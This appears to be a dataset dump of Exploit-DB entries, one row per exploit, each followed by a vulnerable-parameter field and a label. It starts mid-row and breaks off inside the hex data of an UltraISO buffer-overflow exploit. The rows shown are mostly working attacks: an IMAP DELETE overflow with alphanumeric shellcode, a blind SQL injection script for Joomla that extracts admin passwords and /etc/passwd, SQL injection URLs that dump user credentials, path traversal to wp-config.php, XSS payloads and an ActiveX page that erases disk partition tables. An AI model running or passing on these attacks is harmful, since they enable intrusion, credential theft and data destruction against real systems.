""JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIKLjH2vUP7puPQCQEV6aGnkbLWT28NkpEWLlKpT35QhgqKZlKPJvxLKQJWPuQXkKSdrSyLKgDLKuQJNVQ9okLP1KpLlP8kPBT7wyQXOVmvahGZKl25kSLwTGdqeKQlK2zUts1jKSVnktL0KNkaJWlUQxkLK7tnkUQM8zKgrVQYP1OqNQMQKkreXWpSnSZp03i1tlKGilKSkvlLKQK5Lnk7kLKckTH0SSXLNpN6nJLKOJvK9IWK1ZLuPfawps0Rwv63cMYiuJHDguPuPS0Np7qWp7pnV6ywhYwMttYt0Yym5QYK62inDvzd0Kwy4nMDniyXYUYkENMHKxmylgKpWPSVRSovS4ruPckLMpKupRqKOYGK9YOoyKsLMBUTTRJs7Ryv1RsYoTtNokOv534pYk9dDNnyrxrtkgWPTKOtwIoRutpfQkp2ppPrpF0spPPaPv09oRuFLniYWuaYKScpSe86bC07a3lmYIpSZVpRpQGyoruQ4QCF7kOv5thBsSdSgIoRuUpNiYWPhpCRmStwpoyXcLGyjDqIPnmQlQ4NLaz7e69zSlkNgJZosXlPTkvQT7TTP1TQvYWpDWTul5QUQLIcLTdRhK9SLQ4RlmY1letPPLMSt5tFpqDrppQRqCaSqSa2iBqRqRspQKO45uPbH0rKNNS4VKOpU5TyoXPLIyvKO45S0QxnMN9fexNYov5S4oyHCbJKOKOTvkOzsyorU30BHl0MZfdaOkORu7tFQyKPSIo8PA"";  getopts(""h:u:p:"", \%args);  if ((!defined $args{h}) || (!defined $args{u}) || (!defined $args{p})) {    print ""Usage: $0 -h [host] -u [username] -p [password]\n"";    exit;}  $usr  = $args{u}; $pwd  = $args{p}; $host = $args{h};  # jb +20; jnb +20  -> jump over return address (0x21 is first ascii safe offset) $jmp21 = ""r!s!"";  # 0x6921526A -> pointer to ""CALL [EDX+8]"" ends up in return address ########################################################################## # This should hopefully be the only version dependent variable here. # Find an ASCII safe address pointing to a CALL [EDX+8] for your OS ########################################################################## $calledx8 = ""jR!i"";  # aAA aligns ESP with the egghunter shellcode (popad, pop, pop) $asciieh = ""aAA"" . $egghunter; $asciisc = ""w00tw00t"" . $shellcode; $email =    ""From: \""The guy hacking you\"" <a\@b.com>\r\n"" .    ""To: \""Poor You\"" <b\@c.com>\r\n"" .    ""Subject: $asciisc\r\n"" .    ""Date: Wed, 3 Nov 2004 14:45:11 +0100\r\n"" .    ""Message-ID: <000101c4c1acdcndj6d69b90$5e01a8c0\@snorlax>\r\n"" .    ""Content-Type: text/plain;\r\n\tcharset=\""us-ascii\""\r\n"" .    ""Content-Transfer-Encoding: 7bit\r\n"" .    ""\r\n"" .    $asciisc;  $payload = ""A"" x 236 . $jmp21 x 3 . $calledx8 . ""S"" x 29 . $asciieh . ""\r\n"";  print ""Login in to $host as $usr/$pwd\n""; my $imap = Mail::IMAPClient->new( Server => $host, User => $usr, Password=> $pwd) or die ""Cannot connect: $@""; print ""count: "" . $imap->message_count(""Inbox"") . ""\n""; print ""Sending EGG\n""; $imap->select(""Inbox"") or die ""Could not select: $@\n""; my $uid = $imap->append( ""Inbox"", $email ) or die ""Cannot append: $@""; $msg =  $imap->message_string($uid) or die ""Cannot get message: $@""; #$msg =  $imap->body_string($uid) or die ""Cannot get message: $@"";  #print ""retrieving $uid back: $msg\n"";  print ""Overflowing DELETE\n""; $imap->delete($payload) or die ""Cannot delete: $@n"";  print(""Finished...\n"");  # milw0rm.com [2004-11-12]","[""'DELETE'""]",1
36913,"Joomla! 2.5.1 - 'redirect.php' Blind SQL Injection source: https://www.securityfocus.com/bid/52312/info  Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   #!/usr/bin/perl # Thu Mar 15 22:55:32 CET 2012 A. Ramos <aramosf()unsec.net> # www.securitybydefault.com # Joomla <2.5.1 time based sql injection - vuln by Colin Wong #  # using sleep() and not benchmark(), change for < mysql 5.0.12  # # 1.- Database name: database() # 2.- Users data table name: (change 'joomla' for database() result)  #   select table_name from information_schema.tables where table_schema = ""joomla"" and table_name like ""%_users"" # 3.- Admin password: (change zzz_users from previus sql query result) #   select password from zzzz_users limit 1    use strict; use LWP::UserAgent; $| = 1;   my $url = $ARGV[0]; my $wtime = $ARGV[1]; my $sql = $ARGV[2];  unless ($ARGV[2]) {  print ""$0 <url> <wait time> <sql>\n"";  print ""\texamples:\n"";  print ""\t get admin password:\n"";  print ""\t\t$0 http://host/joomla/ 3 'database()'\n"";  print ""\t\t$0 http://host/joomla/ 3 'select table_name from information_schema.tables where table_schema=\""joomla\"" and table_name like \""%25_users\""\'\n"";  print ""\t\t$0 http://host/joomla/ 3 'select password from zzzz_users limit 1'\n"";  print ""\t get file /etc/passwd\n"";  print ""\t\t$0 http://host/joomla/ 3 'load_file(\""/etc/passwd\"")'\n"";  exit 1; }  my ($len,$sqldata);  my $ua = LWP::UserAgent->new; $ua->timeout(60); $ua->env_proxy;  my $stime = time(); my $res = $ua->get($url); my $etime = time(); my $regrtt = $etime - $stime; print ""rtt: $regrtt secs\n""; print ""vuln?: "";  my $sleep = $regrtt + $wtime; $stime = time(); $res = $ua->get($url.""/index.php/404' union select sleep($sleep) union select '1""); $etime = time(); my $rtt = $etime - $stime; if ($rtt >= $regrtt + $wtime) { print ""ok!\n""; } else { print ""nope :(\n""; exit 1; }   my $lenoflen; sub len {  # length of length  for (1..5) {    my $sql=$_[0];   $stime = time();   $res = $ua->get($url.""/index.php/404' union select if(length(length(($sql)))=$_,sleep($wtime),null) union select '1"");   $etime = time();   my $rtt = $etime - $stime;   if ($rtt >= $regrtt + $wtime) {     $lenoflen = $_;     last;   }  }  for (1..$lenoflen) {   my $ll;   $ll=$_;   for (0..9) {   my $sql=$_[0];   $stime = time();   $res = $ua->get($url.""/index.php/404' union select if(mid(length(($sql)),$ll,1)=$_,sleep($wtime),null) union select '1"");   $etime = time();   my $rtt = $etime - $stime;   if ($rtt >= $regrtt + $wtime) {     $len .= $_;   }   }  }   return $len;  }  sub data {  my $sql = $_[0];  my $len = $_[1];  my ($bit, $str, @byte);  my $high = 128;   for (1..$len) {    my $c=8;    @byte="""";   my $a=$_;   for ($bit=1;$bit<=$high;$bit*=2) {     $stime = time();     # select if((ord(mid((load_file(""/etc/passwd"")),1,1)) & 64)=0,sleep(2),null) union select '1';     $res = $ua->get($url.""/index.php/404' union select if((ord(mid(($sql),$a,1)) & $bit)=0,sleep($wtime),null) union select '1"");     $etime = time();     my $rtt = $etime - $stime;     if ($rtt >= $regrtt + $wtime) {       $byte[$c]=""0"";     } else { $byte[$c]=""1""; }   $c--;   }      $str = join("""",@byte);   print pack(""B*"",""$str"");   }  }  $len = len($sql); print ""$sql length: $len\n""; print ""$sql data:\n\n""; data($sql,$len);","[""'redirect.php'""]",1
27281,"Telmanik CMS Press 1.01b - 'pages.php?page_name' SQL Injection ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ [x] Type: SQL Injection [x] Vendor: www.telmanik.com [x] Script Name: Telmanik CMS Press [x] Script Version: 1.01b [x] Script DL: http://www.telmanik.com/download/Telmanik_CMS_Press/1.01_beta/telmanik_cms_press_v1.01_beta.zip [x] Author: Anarchy Angel [x] Mail : anarchy[at]dc414[dot]org ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Exploit:  http://site.org/themes/pages.php?page_name=[SQLi]  you have to formate you injection like so: union_select_row_from_table Replacing spaces with �_�.  Ex:  http://site.org/themes/pages.php?page_name=union_select_password_from_members  This is a special DefCon 21 kick off from me! See ya there [image: ;)]  Special Tnx : dc414, lun0s, proge, sToRm, progenic, gny","[""'pages.php?page_name'""]",1
5450,"Classifieds Caffe - 'cat_id' SQL Injection --==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==-- --==+               Classifieds Caffe (index.php cat_id) Remote SQL Injection            +==-- --==+====================================================================================+==--                      [+] [JosS] + [Spanish Hackers Team] + [Sys - Project]  [+] Info:  [~] Software: Classifieds Caffe [~] Exploit: Remote SQL Injection [High] [~] Where: index.php [~] Bug Found By: JosS [~] Contact: sys-project[at]hotmail.com [~] Web: http://www.spanish-hackers.com  [+] Exploit:  [~] /index.php?action=add&cat_id=[SQL] [~] 7'+union+all+select+0,1,convert(concat(database(),char(58),user(),char(58),version()),char),3/*  --==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==-- --==+                                       JosS                                         +==-- --==+====================================================================================+==--                                        [+] [The End]  # milw0rm.com [2008-04-15]","[""'cat_id'""]",1
38936,WordPress Plugin Advanced Dewplayer - 'download-file.php' Script Directory Traversal source: https://www.securityfocus.com/bid/64587/info  The Advanced Dewplayer plugin for WordPress is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input.  Exploiting this issue can allow an attacker to obtain sensitive information that could aid in further attacks.  Advanced Dewplayer 1.2 is vulnerable; other versions may also be affected.   http://www.example.com/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php,"[""'download-file.php'""]",1
8330,"PHPRecipeBook 2.39 - 'course_id' SQL Injection ////////////////////////////////////////////////////////////////////// ////////////////////////////1923TURK - GRUP/////////////////////////// ////////////////////////////////////////////////////////////////////// ********************************************************************** [!] Script : PHPRecipeBook [!] Verison : 2.39 [!] Download : http://sourceforge.net/projects/phprecipebook/  [-] Bugs : Remote SQL injection Exploit  [-] Dork : inurl:""/index.php?m="" ""PHPRecipeBook 2.39"" [-] Date : 31-03-09(19:33) [+] Author : DarKdewiL [+] GroupWeb : www.1923turk.biz [-] Contact : darkdewil@1923turk.biz  [!] Note : Always use the time you have to finish your work.   Never leave it to the last minute.   Once time goes away, it never comes back  ********************************************************************** ////////////////////////////////////////////////////////////////////// ********************************************************************** [-- Bugs --]  (+)  /index.php?m=recipes&a=search&search=yes&course_id=[SQLEXP]  [-- SQL EXPLOIT --]  Username exploit : -7+union+select+1,user_login,3,4,5,6,7+from+security_users-- Password exploit : -7+union+select+1,user_password,3,4,5,6,7+from+security_users--  # milw0rm.com [2009-03-31]","[""'course_id'""]",1
25459,CityPost PHP Image Editor M1/M2/M3/Imgsrc/M4 - 'URI' Cross-Site Scripting source: https://www.securityfocus.com/bid/13256/info source: https://www.securityfocus.com/bid/13257/info source: https://www.securityfocus.com/bid/13258/info source: https://www.securityfocus.com/bid/13259/info source: https://www.securityfocus.com/bid/13260/info  CityPost Image Cropper/Resizer is affected by a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input to the 'image-editor-52.php' script.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/image-editor-52/?m1=[XSS]&m2=[XSS]&m3=[XSS]&imgsrc=[XSS]&m4=[XSS],"[""'URI'""]",1
41008,"Adobe Flash Player 24.0.0.186 - 'ActionGetURL2' Out-of-Bounds Memory Corruption (1) Source: https://cosig.gouv.qc.ca/en/cosig-2017-01-en/  #####################################################################################  # Application: Adobe Flash Player # Platforms: Windows,OSX # Versions: 24.0.0.186 and earlier # Author: Francis Provencher of COSIG # Website: https://cosig.gouv.qc.ca/en/advisory/ # Twitter: @COSIG_ # Date: January 10, 2017 # CVE-2017-2930 # COSIG-2016-35  #####################################################################################  1) Introduction 2) Report Timeline 3) Technical details 4) POC  #####################################################################################  ================ 1) Introduction ================  Adobe Flash Player (labeled Shockwave Flash in Internet Explorer and Firefox) is a freeware software for using content created on the Adobe Flash platform, including viewing multimedia, executing rich Internet applications, and streaming video and audio. Flash Player can run from a web browser as a browser plug-in or on supported mobile devices.[7] Flash Player was created by Macromedia and has been developed and distributed by Adobe Systems since Adobe acquired Macromedia.  (https://en.wikipedia.org/wiki/Adobe_Flash_Player)  #####################################################################################  ============================ 2) Rapport de Coordination ============================  2016-11-13: Francis Provencher of COSIG report this vulnerability to Adobe PSIRT; 2016-11-14: Adobe PSIRT confirm this vulnerability; 2017-01-10: Adobe publish a patch (APSB17-02); 2017-01-10: Advisory released by COSIG;  #####################################################################################  ===================== 3) Technical details =====================  The vulnerability allows a remote attacker to execute malicious code or access to a part of the dynamically allocated memory using a user interaction visiting a Web page or open a specially crafted SWF file, an attacker is able to create an “out of bound” memory corruption. A file with an “ActionRecord” structure that contain an invalid value in “ActionGetURL2” could lead to remote code execution in the context of the current user.  #####################################################################################  =========== 4) POC: ===========  https://cosig.gouv.qc.ca/wp-content/uploads/2017/01/COSIG-2017-01.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41008.zip  ####################################################################################","[""'ActionGetURL2'""]",1
22692,"Zeus Web Server 4.x - Admin Interface 'VS_Diag.cgi' Cross-Site Scripting source: https://www.securityfocus.com/bid/7751/info  The Zeus Web Server contains a web based administration interface that is vulnerable to cross site scripting attacks.  Due to insufficient sanitization of user-supplied input, it is possible for an attacker to construct a malicious link which contains arbitrary HTML and script code, which will be executed in the web client of a user who visits the malicious link. It should be noted that the user must authenticate with the administrative interface for the attack to succeed.  The vendor has stated that cookies are not used to store usernames and passwords.  http://<target>:9090/apps/web/vs_diag.cgi?server=<script>function%20pedo() {var%20xmlHttp%20=%20new%20ActiveXObject(""Microsoft.XMLHTTP"");xmlHttp.open (""GET"",""http://<target>:9090/apps/web/global.fcgi"",false);xmlHttp.send ();xmlDoc=xmlHttp.responseText;document.write(xmlDoc);}pedo();alert(""Have% 20you%20enabled%20the%20protection%20of%20your%20ZEUS...?%20We%20can%20rip% 20this%20info!%20Much%20more%20evil%20actions%20are%20possible..."") </script>","['Interface', ""'VS_Diag.cgi'""]",1
28395,"VMware 5.5.1 - Partition Table Deletion Denial of Service source: https://www.securityfocus.com/bid/19551/info  VMware is prone to a remote denial-of-service vulnerability.  An attacker can exploit this issue to destroy partition tables on the affected computer and to deny service to legitimate users.  This issue affects VMware version 5.5.1; other versions may also be vulnerable for Windows.   =============== vmware.htm start ================  <!--  // VMware 5.5.1 for Windows arbitrary partition table delete issue.  // Tested on Windows Server 2000/2003  //  // nop nop#xsec.org  // http://www.xsec.org  //  // CLSID: {0F748FDE-0597-443C-8596-71854C5EA20A}  // Info: Vie2Locator Class  // ProgID: VieLib2.Vie2Locator.1  // InprocServer32: C:\Program Files\Common Files\VMware\VMware Virtual  Image Editing\vielib.dll  --!>  <html><body>  <object classid=""clsid:{0F748FDE-0597-443C-8596-71854C5EA20A}""  id=""vmware""> </object>  <script>  var disk = 0; // HardDisk No  while (disk < 20)  {  var x = vmware.ConnectDisk(disk); // Connect to HardDisk  x.ResetLayout(); // Will clean all partition table on your Harddisk  disk += 1;  }  </script>  </body></html>  =============== vmware.htm end ==================",['vielib.dll '],1
27827,"Ocean12 Technologies Calendar Manager Pro 1.0 1 - '/admin/edit.asp?ID' SQL Injection source: https://www.securityfocus.com/bid/17877/info    Calendar Manager Pro is prone to multiple input-validation vulnerabilities. The issues include cross-site scripting and SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.     A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.   http://www.example.com/patj/admin/edit.asp?ID=[SLQ]","[""'/admin/edit.asp?ID'""]",1
36112,"WordPress Plugin Duplicator 0.5.8 - Privilege Escalation # Exploit Title: Duplicator 0.5.8 Privilege Escalation # Date: 21-11-2014 # Software Link: https://wordpress.org/plugins/duplicator/ # Exploit Author: Kacper Szurek # Contact: http://twitter.com/KacperSzurek # Website: http://security.szurek.pl/ # Category: webapps  1. Description    Every registered user can create and download backup files.  File: duplicator\duplicator.php add_action('wp_ajax_duplicator_package_scan',		'duplicator_package_scan'); add_action('wp_ajax_duplicator_package_build',		'duplicator_package_build'); add_action('wp_ajax_duplicator_package_delete',		'duplicator_package_delete'); add_action('wp_ajax_duplicator_package_report',		'duplicator_package_report');  http://security.szurek.pl/duplicator-058-privilege-escalation.html  2. Proof of Concept  Login as regular user (created using wp-login.php?action=register) then start scan:  http://wordpress-url/wp-admin/admin-ajax.php?action=duplicator_package_scan  After that you can build backup:  http://wordpress-url/wp-admin/admin-ajax.php?action=duplicator_package_build  This function will return json with backup name inside File key.  You can download backup using:  http://wordpress-url/wp-snapshots/%file_name_from_json%  3. Solution:    Update to version 0.5.10",['login.php?'],1
43257,"FS Crowdfunding Script 1.0 - 'latest_news_details.php?id' SQL Injection # # # # #  # Exploit Title: FS Crowdfunding Script 1.0 - SQL Injection # Dork: N/A # Date: 08.12.2017 # Vendor Homepage: https://fortunescripts.com/ # Software Link: https://fortunescripts.com/product/crowdfunding-script/ # Demo: http://crowdfunding.demonstration.co.in/ # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... #  # Proof of Concept:  #  # 1) # http://localhost/[PATH]/latest_news_details.php?id=[SQL] #  # -4'++UNION+ALL+SELECT+1,2,3,4,5,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2))--+- #  # http://server/latest_news_details.php?id=-4'++UNION+ALL+SELECT+1,2,3,4,5,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2))--+- #  # # # # #","[""'latest_news_details.php?id'""]",1
3612,"XOOPS Module Repository - 'viewcat.php' SQL Injection #!/usr/bin/perl #[Script Name: XOOPS Module Repository (viewcat.php) BLIND SQL Injection Exploit #[Coded by   : ajann #[Author     : ajann #[Dork       : ""inurl:/modules/repository/"" #[Contact    : :( #[S.Page     : http://www.xoops.org/ #[$$         : ?? #[.          : Tested on xoops.org and xoops.pr.gov.br  #[..         : ajann,Turkey   use IO::Socket; if(@ARGV < 1){ print "" [======================================================================== [//  XOOPS Module Repository (viewcat.php) BLIND SQL Injection Exploit [//                   Usage: exploit.pl [target] [//                   Example: exploit.pl victim.com [//                   Example: exploit.pl victim.com [//                           Vuln&Exp : ajann [======================================================================== ""; exit(); } #Local variables $kapan = ""/*""; $server = $ARGV[0]; $server =~ s/(http:\/\/)//eg; $host = ""http://"".$server; $port = ""80""; $file = ""/modules/repository/viewcat.php?cid="";  print ""Script <DIR> : ""; $dir = <STDIN>; chop ($dir);  if ($dir =~ /exit/){ print ""-- Exploit Failed[You Are Exited] \n""; exit(); }  if ($dir =~ /\//){} else { print ""-- Exploit Failed[No DIR] \n""; exit();  }  print ""User ID (uid): ""; $id = <STDIN>; chop ($id);  $target = ""111111%20union%20select%202,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass)%20from%20xoops_users%20where%20uid%20like%20"".$id.$kapan; $target = $host.$dir.$file.$target;  #Writing data to socket print ""+**********************************************************************+\n""; print ""+ Trying to connect: $server\n""; $socket = IO::Socket::INET->new(Proto => ""tcp"", PeerAddr => ""$server"", PeerPort => ""$port"") || die ""\n+ Connection failed...\n""; print $socket ""GET $target HTTP/1.1\n""; print $socket ""Host: $server\n""; print $socket ""Accept: */*\n""; print $socket ""Connection: close\n\n""; print ""+ Connected!...\n""; #Getting while($answer = <$socket>) { if ($answer =~ /username:(.*?)pass/){ print ""+ Exploit succeed! Getting admin information.\n""; print ""+ ---------------- +\n""; print ""+ Username: $1\n""; }  if ($answer =~ /password:(.*?)<\/a>/){ print ""+ Password: $1\n""; }  if ($answer =~ /Syntax error/) {  print ""+ Exploit Failed : ( \n""; print ""+**********************************************************************+\n""; exit();  }  if ($answer =~ /Internal Server Error/) { print ""+ Exploit Failed : (  \n""; print ""+**********************************************************************+\n""; exit();  }  }  # milw0rm.com [2007-03-30]","[""'viewcat.php'""]",1
8343,"UltraISO 9.3.3.2685 - CCD/IMG Universal Buffer Overflow #!/usr/bin/perl # # UltraISO <= 9.3.3.2685 CCD/IMG Universal Buffer Overflow Exploit # ---------------------------------------------------------------- # Discovered and Exploited by SkD             (skdrat@hotmail.com) # # A nice exploit for this software that was just recently # patched after a few other discoveries in it. # This is 0day at the moment and is very reliable. # # Just open either file CCD or IMG in UltraISO :). # # Another note is that the CCD will also cause an access violation # in MagicISO. # # Private exploits for sale, contact me at (skdrat@hotmail.com). # # WARNING: Author has no responsibility over the damage done # with this! use strict; use warnings;  my $img_data1 = ""\x00\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        